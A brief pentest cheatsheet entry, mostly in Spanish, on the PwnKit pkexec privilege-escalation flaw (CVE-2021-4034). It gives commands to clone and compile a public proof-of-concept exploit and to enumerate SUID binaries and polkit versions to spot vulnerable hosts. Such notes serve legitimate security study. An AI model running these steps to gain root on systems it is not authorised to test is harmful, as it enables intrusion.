
```shell-session
git clone https://github.com/arthepsy/CVE-2021-4034.git

cd CVE-2021-4034

gcc cve-2021-4034-poc.c -o poc
```

NOTA:
Esta vulnerabilidad afectó a instalaciones por defecto (sin manipular aún, es decir, no es una mala configuración.) de muchas distribuciones de linux dónde polkit estuviese instalado, afectando concretamente al binario pkexec.

Si vemos información sobre la distro `cat /etc/os-release` y es anterior a 2021, por ejemplo un ubuntu 20.04, luego buscamos por binarios SUID `find / -perm -4000 2>/dev/null` y aparece en la lista **/usr/bin/pkexec** cuyo propietario es root, podemos empezar a sospechar. Y buscamos la versión `/usr/bin/pkexec --version` en google a ver si es vulnerable.

Get a vulnerable version of `pkexec` e.g. from `policykit-1 <= 0.105-31`

`apt-cache policy policykit-1`